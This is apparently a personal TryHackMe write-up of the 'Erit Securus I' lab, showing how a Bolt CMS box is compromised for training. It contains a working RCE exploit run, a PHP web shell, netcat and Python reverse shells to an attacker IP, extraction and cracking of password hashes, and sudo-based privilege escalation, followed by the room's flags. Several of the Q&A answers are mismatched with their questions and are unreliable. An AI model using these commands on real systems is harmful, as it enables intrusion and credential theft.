<h1 align="center">Erit Securus I</h1>
<p align="center">2025, August 9<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>460</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Learn to exploit the BoltCMS software by researching exploit-db.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/8a157d7c-b065-489b-8b21-f309d36061d4"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/eritsecurusi">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7a85d4a8-17af-47b1-bf2d-e50fe754d41a"></p>


<br>

<h2>Task 1 . Deploy Box</h2>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy box<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Reconnaissance</h2>
<p>We run a simple nmap scan. You can learn more here (https://tryhackme.com/room/vulnversity)</p>

<p><em>Answer the questions below</em></p>

<p>2.1. How many ports are open?<br>
<code>2</code></p>

<br>

<p>2.2.What ports are open? Comma separated, lowest first: **,**<br>
<code>22,80</code></p>

<p>

- 22 : <code>ssh</code> : <code>OpenSSH 6.7p1 Debian</code><br>
- 80 : <code>nginx 1.6.2</code> : <code>Bolt</code></p>

```bash
:~/EritSecurusI# nmap -sC -sV -p- -T4 TargetIP
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    nginx 1.6.2
|_http-generator: Bolt
|_http-server-header: nginx/1.6.2
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
```

<br>
<h2>Task 3 . Exploit</h2>

<p>Examine webserver. Identify what web-app is running.</p>

<p><em>Answer the question below</em></p>

<p>3.1. How many ports are open?<br>
<code>Bolt</code></p>

<h3>Web 80</h3>

<img width="1131" height="611" alt="image" src="https://github.com/user-attachments/assets/90d71623-a20c-4a68-9c27-fefe4ae3175d" />

<img width="1127" height="609" alt="image" src="https://github.com/user-attachments/assets/5b394442-5385-46e9-8f76-e755bb476128" />

<br>
<h2>Task 4 . Exploit</h2>
<p>Download exploit for this app = <code>https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py</code>code>. The exploit works, but might not fire every time. If you first don't succeed... </p>

<p><em>Answer the questions below</em></p>

<p>4.1. In the exploit from 2020-04-05, what language is used to write the exploit?<br>
<code>python</code></p>

<img width="1122" height="403" alt="image" src="https://github.com/user-attachments/assets/78090d64-1e22-4e4d-9244-53f10fc54819" />

<br>

<p>Another reference ...

- [<br>](https://github.com/blu3ming/Bolt_CMS_3.7.0-Auth_RCE)<br>
- <img width="1123" height="530" alt="image" src="https://github.com/user-attachments/assets/2a41dba3-b395-4ec8-915f-9a2eb486a5b4" />
</p>

<p>Searchsploit<br>

- Bolt CMS 3.7.0 - Authenticated Remote Code Execution</p>

```bash
:~/EritSecurusI# searchsploit bolt
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow                                | multiple/dos/41869.html
Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                            | php/webapps/47501.txt
Bolt CMS 3.6.4 - Cross-Site Scripting                                                                   | php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                                     | php/webapps/46664.html
Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                                    | php/webapps/48296.py
Bolt CMS < 3.6.2 - Cross-Site Scripting                                                                 | php/webapps/46014.txt
Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                                                 | multiple/remote/24982.txt
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                    | php/webapps/48411.txt
Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                                             | php/webapps/21132.txt
CMS Bolt - Arbitrary File Upload (Metasploit)                                                           | php/remote/38196.rb
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

<p>4.2. As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in. Hint : admin:password <br>
<code>22,80</code></p>


```bash
:~/EritSecurusI# searchsploit -m php/webapps/48296.py
  Exploit: Bolt CMS 3.7.0 - Authenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48296
     Path: /opt/exploitdb/exploits/php/webapps/48296.py
    Codes: N/A
 Verified: False
File Type: Python script, UTF-8 Unicode text executable
Copied to: /root/EritSecurusI/48296.py
```

```bash
:~/EritSecurusI# python3 48296.py http://10.201.19.213 admin password

...
Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex
[+] Retrieving CSRF token to submit the login form
48296.py:56: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  token = soup.findAll('input')[2].get("value")
[+] Login token is : jojDO4pay_iso8e7lv88842nwYn8PjrCk4GQP8KYJJA
48296.py:72: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  token0 = soup0.findAll('input')[6].get("value")
48296.py:90: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  csrf = soup1.findAll('div')[12].get("data-bolt_csrf_token")
[+] SESSION INJECTION 
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test5
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test15
[-] Not found.
Enter OS command , for exit 'quit' : 
```

<br>
<h2> Task 5 . Reverse shell</h2>
<p><code>python3 exploit.py http://ip username password </code></p>

<img width="1903" height="637" alt="image" src="https://github.com/user-attachments/assets/895df3f9-f7ee-4486-88c1-504dd43b4575" />

<p>We can create a simple php-shell on the server, like this:echo '<?php system($_GET["c"]);?>'>c.phpThis we can use to upload a netcat reverse shell on the system and get a reverse shell, as there is no netcat on the box.
If you are using Kali Linux, the netcat installed supports the -e parameter (execute). Using this parameter we can start a shell upon connecting. 

The e parameter is often removed from netcat in a lot of the Linux distributions, because it can be exploited to gain a shell. :-)

First we link the installed netcat to the current directory on our attacking machine:

ln -s $(which nc) .

Then we start a simple web server to serve some files, make sure the files you want to serve are in the current directory:

This will listen on port 8000 on you local machine: python3 -m http.server 8000

Using the c.php file we just dropped, we can browse tohttp://serverip/files/cmd.php?c=wget http://yourip:8000/ncto
download a linux netcat to the server, you will see in your web server if it has been retrieved:

This file is dropped in the same directory as our c.php. We make this nc executable like this: http://serverip/files/cmd.php?c=chmod 755 nc

Now start a netcat listener on your own machine, listening on a free port (we use 4444 here)

ncat -nv -l -p 4444

When it is uploaded and made executable, we can run it like this:

http://serverip/files/cmd.php?c=./nc -e /bin/bash yourip 4444


If all goes well, you will see a connection coming in from the bolt server:
(Don’t forget to do the python pty dance, to make sure you have a shell with PTY’s allocated, some commands, especially sudo, require a PTY shell to run)


python -c 'import pty;pty.spawn("/bin/bash")'</p>

<p><em>Answer the question below</em></p>

<p>5.1. What is the username of the user running the web server? Hint : id<br>
<code>python</code></p>

```bash
Enter OS command , for exit 'quit' : echo '<?php system($_GET["c"]);?>'>c.php
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:2:"10";s:10:"*user_id";i:1;s:8:"*token";s:64:"e24a8ffc4daebd4b1b586ae4cbadb4be735d14ab3de9d49282260f592bec0459";s:7:"*salt";s:32:"1e7ed5c76f11a3bdc2ee3623f4c9bdc2";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 16:01:38.867697";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:13:"192.168.100.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 16:01:38.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587830498;}s:10:"_csrf/bolt";s:43:"-kIwVPHftVt0SZ3XJ_uBEDpT2x-COHYjo4ZSN5H7NUE";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"Spoy_vDCzRmnuZPfXYVJNmphWLl7Dv4kuc89Yev_2ag";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587830500;s:1:"c";i:1587830498;s:1:"l";s:1:"0";}}
```

```bash
Enter OS command , for exit 'quit' : ln -s $(which nc) .
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:2:"10";s:10:"*user_id";i:1;s:8:"*token";s:64:"e24a8ffc4daebd4b1b586ae4cbadb4be735d14ab3de9d49282260f592bec0459";s:7:"*salt";s:32:"1e7ed5c76f11a3bdc2ee3623f4c9bdc2";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 16:01:38.867697";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:13:"192.168.100.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 16:01:38.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587830498;}s:10:"_csrf/bolt";s:43:"-kIwVPHftVt0SZ3XJ_uBEDpT2x-COHYjo4ZSN5H7NUE";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"Spoy_vDCzRmnuZPfXYVJNmphWLl7Dv4kuc89Yev_2ag";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587830500;s:1:"c";i:1587830498;s:1:"l";s:1:"0";}}
```

```bash
:~/EritSecurusI# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/EritSecurusI# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.19.213 - - [09/Aug/2025 15:08:33] "GET /nc HTTP/1.1" 200 -
```

```bash
http://10.201.19.213/files/c.php?id
```

<img width="1127" height="72" alt="image" src="https://github.com/user-attachments/assets/b64cea7c-4f98-4024-8417-6291de5c8da6" />


<br>
<h2>Task 6 . Priv esc</h2>
<br>


<p><em>Answer the questions below</em></p>

<p>6.1. What is the users password?<br>
<code>snickers</code></p>

<br>

<p>6.2. Flag 1<br>
<code>THM{Hey!_Welcome_in}</code></p>


```bash
http://10.201.19.213/files/c.php?c=ls -lah /var/www/html/app/database
```

<img width="1132" height="72" alt="image" src="https://github.com/user-attachments/assets/c73e2663-c259-4d5f-9703-68ad6bec1c20" />

```bash
http://10.201.19.213/files/c.php?c=ls%20%20/home/wileec
```

<img width="1107" height="73" alt="image" src="https://github.com/user-attachments/assets/e3bc944c-d35f-42fe-bce0-e1a44ae7d8b0" />

```bash
http://10.201.19.213/files/c.php?c=cat%20/home/wileec/flag1.txt
```

<img width="1130" height="67" alt="image" src="https://github.com/user-attachments/assets/2e8f2b98-bbe8-4cb4-b303-c2c78776ec3c" />


<br>
<h2>Task 7 . Pivoting</h2>
<br>


<p><em>Answer the question below</em></p>

<p>7.1. User wileec can sudo! What can he sudo? Hint : sudo -l<br>
<code>(jsmith) NOPASSWD: /usr/bin/zip</code></p>

<br>

<p>6.2. Flag 1<br>
<code>THM{Hey!_Welcome_in}</code></p>


```bash
http://10.201.19.213/bolt/login
```

<img width="1125" height="582" alt="image" src="https://github.com/user-attachments/assets/33597c37-3663-4979-aac7-47bb0672cbb9" />


<br>

```bash
http://10.201.19.213/files/c.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.201.38.5%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
```

```bash
:~/EritSecurusI# nc -nv -l -p 4444
Listening on 0.0.0.0 4444
Connection received on 10.201.19.213 58917
www-data@Erit:/var/www/html/public/files$ whoami
whoami
www-data
www-data@Erit:/var/www/html/public/files$ pwd
pwd
www-data@Erit:/var/www/html/public/files$ ^Z
[1]+  Stopped                 nc -nv -l -p 4444
:~/EritSecurusI# stty raw -echo; fg
nc -nv -l -p 4444

www-data@Erit:/var/www/html/public/files$ export term=xterm
```

```bash
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
SQLite version 3.16.2 2017-01-06 16:32:41
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken          bolt_field_value        bolt_pages            
bolt_blocks             bolt_homepage           bolt_relations        
bolt_content_changelog  bolt_log                bolt_showcases        
bolt_cron               bolt_log_change         bolt_taxonomy         
bolt_entries            bolt_log_system         bolt_users            
sqlite> SELECT * FROM bolt_users;
1|admin|$2y$10$./wlUzesFrd3R6EIgLFC0O5w1IewdmrkUJnhALixHH6jbqvMcegCC||0|a@a.com|2025-08-09 14:27:10|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
sqlite> 
```

<img width="1131" height="285" alt="image" src="https://github.com/user-attachments/assets/2de02d1a-d7e9-457a-9a6b-370e025aa242" />

```bash
:~/EritSecurusI# john wildoneHash --wordlist=/usr/share/wordlists/rockyou.txt 
```

<img width="1141" height="265" alt="image" src="https://github.com/user-attachments/assets/298a151f-64c3-4c42-be96-967117e8de8c" />

```bash
www-data@Erit:/var/www/html/app/database$ su wileec
Password: 
$ whoami
wileec
$ SHELL=/bin/bash script -q /dev/null
wileec@Erit:/var/www/html/app/database$ cd /home/wileec
wileec@Erit:~$ ls -lah
total 28K
drwxr-xr-x 4 wileec wileec 4.0K Apr 25  2020 .
drwxr-xr-x 4 root   root   4.0K Apr 25  2020 ..
-rw-r--r-- 1 wileec wileec  220 May 15  2017 .bash_logout
-rw-r--r-- 1 wileec wileec 3.5K May 15  2017 .bashrc
-rw-r--r-- 1 wileec wileec  675 May 15  2017 .profile
drwxr-xr-x 2 wileec wileec 4.0K Apr 25  2020 .ssh
-rw-r--r-- 1 root   root     21 Apr 25  2020 flag1.txt
```

```bash
wileec@Erit:~$ cd .ssh
wileec@Erit:~/.ssh$ ls -lah
total 20K
drwxr-xr-x 2 wileec wileec 4.0K Apr 25  2020 .
drwxr-xr-x 4 wileec wileec 4.0K Apr 25  2020 ..
-rw------- 1 wileec wileec 1.7K Apr 25  2020 id_rsa
-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub
-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts
```

```bash
wileec@Erit:~/.ssh$ cat known_hosts
|1|fGB3FoLnINhfQ8IwTclxB/bDyj4=|7XWVV6hulIAl3Dit1bjiYfFAdsE= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAOH4ypeTzhthRbvcrzqVbbWXG1imFdejEQIo53fimAkjsOcrmEDWwT7Lskm5qyz4dmhGmfsH90xzOgQ+Bm6Nuk=
```

```bash
wileec@Erit:~/.ssh$ getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
192.168.100.100 Erit
```

```bash
wileec@Erit:~$ ssh wileec@192.168.100.1  

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
$ 
```

```bash
$ sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
```


<br>
<h2>Task 8 . Privesc #2</h2>
<p>Using the sudo-trick, we’re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here.</p>


<p><em>Answer the question below</em></p>

<p>8.1. Flag 2<br>
<code>snickers</code></p>


```bash
$ TF=$(mktemp -u)
$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 32%)
```

<br>

<p align="center">GTFOBins ../<code>zip</code><br><img width="250px" src="https://github.com/user-attachments/assets/411f4b4d-adff-4879-9eb7-f197bcf97528"><br>//gtfobins.github.io/gtfobins/zip/</p>

<br>

```bash
$ id
uid=1003(jsmith) gid=1003(jsmith) groups=1003(jsmith)
```

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
jsmith@Securus:/home/wileec$ 
```

```bash
jsmith@Securus:/home/wileec$ cd ..
jsmith@Securus:/home$ ls
jsmith  wileec
jsmith@Securus:/home$ cd jsmith
jsmith@Securus:~$ ls -lah
total 24K
drwxrwx--- 2 jsmith jsmith 4.0K Apr 25  2020 .
drwxr-xr-x 4 root   root   4.0K Apr 26  2020 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3.5K Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
```

```bash
jsmith@Securus:~$ cat flag2.txt
THM{Welcome_Home_Wile_E_Coyote!}
```

<br>
<h2>Task 9 . Root</h2>
<p>As jsmith, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)<br>

There are several ways to exploit this rights. Go for it!</p>


<p><em>Answer the questions below</em></p>

<p>9.1. Flag 2<br>
<code>(ALL : ALL) NOPASSWD: ALL</code></p>

```bash
jsmith@Securus:~$ sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
```

<br>

<p>9.2. Flag 3<br>
<code>(ALL : ALL) NOPASSWD: ALL</code></p>

```bash
jsmith@Securus:~$ sudo su
```

```bash
root@Securus:/home/jsmith# ls -lah /root
total 28K
drwx------  4 root root 4.0K Apr 26  2020 .
drwxr-xr-x 22 root root 4.0K Apr 17  2020 ..
lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt
drwx------  2 root root 4.0K Apr 23  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4.0K Apr 17  2020 .ssh
```


```bash
root@Securus:/home/jsmith# cat /root/flag3.txt
THM{Great_work!_You_pwned_Erit_Securus_1!}
```

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c6e00bc1-1f8e-45b7-96ef-c902554e420a"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/dfb9b05e-a87a-42cb-96ce-c5f8583b7963"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 9    |   460    |     132ⁿᵈ    |      5ᵗʰ     |     474ᵗʰ   |    14ᵗʰ    | 119,856  |    905    |    73     |


</div>

<p align="center">Global All Time:   132ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/7802eac8-5299-45ee-8e82-5899e19ddf96"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/5b3849fb-e3bb-42ee-bf09-fe42488b8385"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/fcf6929f-f550-40b7-8e37-542ed58f8a0c"><br>
                  Global monthly:    474ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/251a8461-081d-4517-b173-9ec615a61967"><br>
                  Brazil monthly:      14ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/975ed3dd-7938-440d-af42-d7ed77860a5e"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
